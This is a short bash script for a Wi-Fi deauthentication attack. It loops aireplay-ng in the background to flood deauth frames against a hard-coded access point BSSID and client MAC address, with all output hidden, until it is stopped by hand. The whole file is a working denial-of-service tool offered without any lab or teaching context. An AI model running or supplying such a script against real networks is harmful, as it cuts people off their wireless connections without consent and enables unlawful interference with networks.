#!/bin/bash

INTERFACE="wlp3s0mon"
BSSID="24:46:E4:1E:F5:7C"
DEAUTH_COUNT=0  # 0 = flood

CLIENTS=(
    "6a:b1:e1:d5:77:a5"
)

echo "[*] Starting parallel deauth for ${#CLIENTS[@]} clients..."

for CLIENT in "${CLIENTS[@]}"; do
    echo "[*] Starting attack on $CLIENT"
    while true; do
        sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT $INTERFACE --ignore-negative-one > /dev/null 2>&1
    done &
done

echo "[*] All attacks running in background. Press Ctrl+C to stop."
wait
